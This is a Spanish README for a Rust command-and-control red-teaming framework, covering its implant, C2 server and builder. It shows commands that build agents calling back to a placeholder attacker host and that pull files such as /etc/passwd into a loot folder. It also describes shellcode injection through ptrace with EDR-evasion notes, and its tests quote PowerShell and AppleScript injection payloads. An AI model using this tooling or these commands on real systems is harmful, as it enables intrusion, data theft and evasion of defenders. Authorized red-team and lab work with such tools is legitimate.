# Chamuko C2

Framework de red teaming multi-plataforma en Rust. Tiene tres piezas: el agente (implant) que corre en la máquina objetivo, el servidor C2 con interfaz de terminal, y un builder que genera agentes con la configuración ya embebida.

> **Aviso:** Esto es para pruebas de penetración autorizadas, ejercicios de red teaming y laboratorios. Usarlo contra sistemas de terceros sin permiso es ilegal.

## Qué trae

- **Agente multi-plataforma:** Linux, Windows y macOS. Sin dependencias del sistema.
- **HTTP y HTTPS:** registro, beacon con sleep y jitter, tareas y resultados. El TLS va con rustls, compilado dentro del binario.
- **Token compartido:** C2 y agentes se autentican con el mismo Bearer (`--token` o `CHAMUKO_TOKEN`).
- **Sleep y jitter en caliente:** los cambias desde la TUI y el agente los aplica en el siguiente beacon, sin reiniciarlo.
- **Se recupera solo:** si reinicias el C2, el agente ve el `404`, se vuelve a registrar y sigue.
- **Plugins declarativos:** un comando es una línea. `PluginBuilder` + una closure y ya está: sin struct, sin implementar cinco métodos. La aridad se valida antes de ejecutar el handler, así que el handler nunca comprueba argumentos.
- **Enrutado por tabla:** el registro guarda `comando -> plugin` en un mapa. Un comando duplicado se rechaza al registrar en vez de depender del orden, y el despacho es una búsqueda, no un recorrido.
- **Política y auditoría:** allowlist o denylist de comandos, y un registro de auditoría acotado. La auditoría guarda el nombre y el número de argumentos, **nunca los valores**: por ahí pasan tokens y contraseñas.
- **Comandos incluidos:** `exec`, `info`, `whoami`, `hostname`, `pwd`, `ls`, `cd`, `ps`, `shellcode`, `download`, `upload`, `screenshot`, `messagebox`, `inject`, `inject-spawn`, `help`.
- **Inyeccion de shellcode:** `inject <pid> <b64>` mete codigo en un proceso ya en marcha, y `inject-spawn <b64> [exe]` lanza el proceso y lo inyecta en la misma llamada. Linux x86_64, con `ptrace`: reserva memoria con `mmap`, escribe ahi un stub y el payload, marca solo el codigo como `r-x` y arranca el payload en un hilo nuevo del objetivo. El payload se codifica igual que en `shellcode` (base64 + XOR).
  - **`ptrace_scope`.** Con el valor `1` (el defecto en Ubuntu y en casi todos los contenedores) el kernel solo deja trazar **descendientes**. `inject <pid>` fallara contra procesos ajenos con un mensaje que lo dice; `inject-spawn` funciona siempre porque el objetivo lo lanza el agente. Si el proceso quedo huerfano (`sh -c 'sleep 300 &'`), ya no es descendiente y tampoco se puede.
  - **Nunca deja el objetivo congelado.** Todo lo que toca el proceso pasa por un guard que restaura los registros y hace `PTRACE_DETACH` al salir, con o sin error, y las esperas tienen plazo. Un proceso parado sin tracer se queda colgado para siempre; ese es el fallo que este diseno evita.
  - **Sin `rwx`.** La memoria se reserva `rw`, se escribe, y solo entonces el codigo pasa a `r-x`. La pila del hilo nuevo se queda en `rw`. Una region `rwx` es lo primero que busca un EDR.
- **Messagebox:** abre un dialogo en el escritorio del agente. Elige backend: PowerShell en Windows, `osascript` en macOS, y en Linux `zenity` → `kdialog` → `xmessage`. El texto es del operador y acaba en un script, asi que se escapa por backend: comillas dobladas en PowerShell, comillas y barras escapadas en AppleScript, y en Linux va como argumento suelto sin pasar por ningun shell.
- **Screenshot:** captura la pantalla y la manda como PNG por el mismo camino troceado que `download`. Elige backend solo: PowerShell en Windows, `screencapture` en macOS, y en Linux `grim` → `scrot` → `import` → framebuffer de `/dev/fb0`. Si el backend deja un fichero que no es un PNG, se descarta en vez de mandar basura.
- **Transferencia de ficheros troceada:** descargas de hasta 64 MiB en chunks de 64 KiB, con reensamblado en `./loot` y verificación SHA-256 en cada punta. El agente no manda un fichero de golpe: lo parte y el C2 comprueba que llegaron todos los trozos antes de escribirlo.
- **Implant de binarios:** subes un fichero al agente por chunks y él lo escribe en la ruta que le digas, comprobando el hash.
- **Ciclo de vida de tareas:** cada tarea pasa por `queued → sent → completed/failed`, con hora de envío, hora de fin y duración en milisegundos. No se reenvía lo ya entregado.
- **Versionado de protocolo:** el C2 rechaza agentes de otra versión con un mensaje claro, en vez de fallar al deserializar.
- **TUI en rojo y negro:** lista de agentes, consola por agente, barra de comandos e historial con flechas.
- **Builder:** compila el agente con URL, sleep, jitter, nombre y token embebidos. Cross-compila, por ejemplo Windows desde Linux.
- **API HTTP:** `/register`, `/beacon`, `/results`, `/enqueue`, `/agents`, `/health`, por si quieres manejarlo desde otro cliente. Cuatro workers y bodies de hasta 1 MiB.

## Cómo está montado

```
chamuko/
├── crates/
│   ├── plugin-api/   Trait Plugin, LifecycleEvent, CommandOutput
│   ├── core/         PluginRegistry: registro, dispatch y routing
│   ├── protocol/     Tipos compartidos agente↔C2 (JSON)
│   ├── agent/        Cliente C2 + loop de beacon + plugin de comandos
│   ├── c2/           Servidor HTTP + TUI (ratatui/crossterm)
│   └── builder/      Genera binarios de agente con config embebida
└── Cargo.toml        Workspace + perfil release (LTO, strip, panic=abort)
```

### Cómo hablan agente y C2

```
Agente                          C2
  |  POST /register  ----------->  asigna ID, fija sleep/jitter
  |  <----------- {id, sleep, jitter}
  |
  |  POST /beacon {id}  -------->  devuelve tareas + sleep/jitter actuales
  |  <----------- {tasks: [...], sleep, jitter}
  |
  |  ejecuta cada tarea vía plugins
  |  POST /results {id, results} ->  almacena y muestra en consola
  |
  |  (sleep + jitter) y repite
  |
  |  si el C2 responde 404 (perdió el estado):
  |  POST /register  ----------->  se re-registra y continúa
```

## Antes de compilar

- Rust 1.85 o superior (aquí se probó con 1.92).
- Para Windows desde Linux: `rustup target add x86_64-pc-windows-gnu` y `mingw-w64` instalado.

## Compilar

```bash
# Todo el workspace
cargo build --workspace

# Release (agente pequeño: LTO, strip, panic=abort)
cargo build --release -p chamuko-agent
cargo build --release -p chamuko-c2
cargo build --release -p chamuko-builder
```

## Uso

### 1. Arrancar el C2

```bash
# En local, sin auth (solo loopback)
cargo run -p chamuko-c2 -- --listen 127.0.0.1:8080

# En red, con token obligatorio
cargo run -p chamuko-c2 -- --port 8080 --token "$(openssl rand -hex 16)"

# Headless, sin TUI (servidores o pruebas)
cargo run -p chamuko-c2 -- --port 8080 --token "$TOKEN" --headless
```

Opciones: `--listen <addr>` (por ejemplo `0.0.0.0:8080`), `--port <port>`, `--token <tok>` o `CHAMUKO_TOKEN`, `--stage <file>`, `--headless`.

`--stage` deja un fichero preparado para que un agente lo recoja con `implant`. Sirve para trabajar sin TUI:

```bash
cargo run -p chamuko-c2 -- --port 8080 --token "$TOKEN" --headless --stage ./payload.bin
# imprime el id de transferencia, que luego pasas a: implant <transfer> <ruta-remota>
```

Sin token solo arranca en loopback. Con cualquier otra dirección se niega, para no dejar una API que ejecuta comandos abierta a la red.

### 2. Generar el agente

```bash
# Linux/macOS
cargo run -p chamuko-builder -- \
  --url https://TU_IP:8443 \
  --sleep 10 \
  --jitter 3 \
  --name oficina-finanzas \
  --token "$TOKEN" \
  --output ./agent

# Windows (cross-compile desde Linux)
cargo run -p chamuko-builder -- \
  --url http://TU_IP:8080 \
  --target x86_64-pc-windows-gnu \
  --output ./agent.exe
```

El builder mete `CHAMUKO_C2_URL`, `CHAMUKO_SLEEP`, `CHAMUKO_JITTER`, `CHAMUKO_NAME` y `CHAMUKO_TOKEN` en el binario con `option_env!`. En ejecución puedes pisar esos valores con `--url`, `--sleep`, `--jitter`, `--name`, `--token` y `--once`.

### 3. Lanzar el agente

```bash
./agent                        # usa lo que trae embebido
./agent --once                 # un beacon y sale, para probar
./agent --url https://OTRO_C2:9090 --token "$TOKEN"  # pisa la config
```

### 4. Manejar agentes desde la TUI

| Comando | Qué hace |
|---------|----------|
| `list` | Ver agentes conectados |
| `use <id>` | Elegir un agente |
| `exec <cmd> [args...]` | Ejecutar un comando en el agente |
| `info` | Datos del host |
| `whoami` | Usuario actual |
| `hostname` | Nombre del host |
| `pwd` | Directorio actual |
| `ls [dir]` | Listar un directorio |
| `cd <dir>` | Cambiar de directorio |
| `sleep <s>` | Cambiar el sleep (se aplica en el siguiente beacon) |
| `jitter <s>` | Cambiar el jitter (se aplica en el siguiente beacon) |
| `ps` | Lista los procesos del agente |
| `shellcode <file>` | Manda shellcode XOR+base64 para ejecutarlo en memoria |
| `download <path>` | Trae un fichero del agente a `./loot` |
| `implant <local> <remoto>` | Sube un fichero local y lo escribe en el agente |
| `tasks` | Historial de tareas con estado y duración |
| `loot` | Ficheros recogidos, con tamaño y hash |
| `staged` | Ficheros preparados esperando que el agente los pida |
| `clear` | Reiniciar el scroll de la consola |
| `help` | Ayuda |
| `quit` o `Ctrl+C` | Salir |

Teclas: `←/→` o `Tab` para cambiar de agente, `↑/↓` para el historial, `Shift+↑/↓` para hacer scroll en la consola.

## API HTTP

| Método | Ruta | Qué hace |
|--------|------|----------|
| POST | `/register` | Registra un agente: `{agent, sleep?, jitter?, protocol}` → `{id, sleep, jitter}` |
| POST | `/beacon` | El agente pide tareas: `{id}` → `{tasks: [...], sleep, jitter}`. `404` si no lo conoce |
| POST | `/results` | El agente manda resultados: `{id, results: [...]}`. `404` si no lo conoce |
| POST | `/enqueue` | Encola una tarea: `{id, command, args}` → `{task_id}` |
| POST | `/upload` | Trozo de fichero del agente: `{id, name, chunk}` → `{received, total, complete}` |
| POST | `/download` | Trozo que el agente pide: `{transfer, index}` → `{chunk, sha256}` |
| GET | `/agents` | Agentes con estado, sleep, jitter, protocolo y contador de tareas |
| GET | `/health` | Health check, sin token |

Todo menos `/health` pide `Authorization: Bearer <token>` cuando arrancas el C2 con `--token` o `CHAMUKO_TOKEN`. Sin token, solo acepta loopback.

Con curl:

```bash
curl -X POST http://127.0.0.1:8080/enqueue \
  -H 'Authorization: Bearer TU_TOKEN' \
  -H 'Content-Type: application/json' \
  -d '{"id":"chamuko-0001","command":"exec","args":["whoami"]}'
```

## Transferencia de ficheros

Los ficheros viajan en chunks de 64 KiB, cada uno con su índice y el total. El receptor no escribe nada hasta tenerlos todos, así que un corte a mitad no deja un fichero corrupto en disco.

**Bajar un fichero del agente**

```
download /etc/passwd
```

El agente lee el fichero, lo parte, y lo empuja con `POST /upload`. El C2 reensambla, calcula el SHA-256 y lo escribe en `./loot/<nombre>`. Si ya existe un fichero con ese nombre, añade un sufijo en vez de pisarlo. El nombre se sanea: `../../etc/passwd` acaba como `passwd` dentro de `loot/`, nunca fuera.

Límite por descarga: 64 MiB. Por encima, el agente se niega y lo dice.

**Subir un fichero al agente**

```
implant ./herramienta.bin /tmp/herramienta
```

El C2 parte el fichero, lo deja preparado, y encola una tarea `implant` con el id de transferencia. El agente pide los trozos con `POST /download`, los une, comprueba el hash y escribe el fichero. Si faltan directorios por medio, los crea.

**Verificación**

Ambas puntas calculan SHA-256 del contenido. El C2 lo guarda junto al loot; el agente lo imprime al escribir. Si los hashes no coinciden, algo se perdió por el camino y se ve de inmediato.

## Multi-plataforma

El agente tira de `std::process`, `std::fs` y `std::env`, y compila para:

- `x86_64-unknown-linux-gnu`
- `x86_64-pc-windows-gnu` / `x86_64-pc-windows-msvc`
- `x86_64-apple-darwin` / `aarch64-apple-darwin`

Lo que cambia según el sistema y ya está resuelto:

- **Variables de entorno:** `HOSTNAME`/`COMPUTERNAME` y `USER`/`USERNAME`.
- **Shell:** en Windows `exec` va por `cmd /C`; en Unix se lanza directo.
- **Rutas:** `cd` entiende letras de unidad (`C:\`) en Windows y rutas absolutas en Unix.
- **Extensiones:** el builder pone `.exe` solo cuando el target es Windows.

## Escribir un plugin

Un comando nuevo son cuatro líneas:

```rust
PluginBuilder::new("net", "0.1.0")
    .command("ping", "ping a host", Arity::Exactly(1), |ctx| {
        Ok(CommandOutput::new(format!("would ping {}", ctx.args[0])))
    })
    .build()
```

El handler recibe un `CommandContext` con los argumentos, el directorio de trabajo y la plataforma. Si necesita devolver un fichero, lo mete en `CommandOutput::with_attachment(...)` y el bucle de beacon lo sube solo.

## Tests

```bash
cargo test --workspace
```

191 tests. Cubren el reensamblado de chunks (fichero vacío y trozos desordenados), el saneado de nombres, el ciclo de vida de las tareas, el rechazo de versiones de protocolo distintas, los comandos contra ficheros reales, la aridad y el enrutado del registro, la política allowlist/denylist, que la auditoría no filtre argumentos, el timeout que mata un proceso colgado, el recorte de salida en límites UTF-8, y la selección de backend de screenshot en las cuatro plataformas.

El plugin de messagebox tiene sus propios tests de inyeccion: un mensaje como `'; Remove-Item C:\ -Recurse; '` no puede cerrar la cadena de PowerShell, uno con `" & (do shell script "id") & "` no puede escapar de AppleScript, y un subproceso real comprueba que el texto hostil llega a zenity como **un solo** argumento y que nada de lo que contiene se ejecuta.

Los PNG que genera el encoder del framebuffer se validan con Python (`zlib` + `struct`, comprobando el CRC de cada chunk): verificar la salida con nuestro propio parser no demostraría nada.

## Licencia

Para uso educativo y red teaming autorizado. Sin garantías.
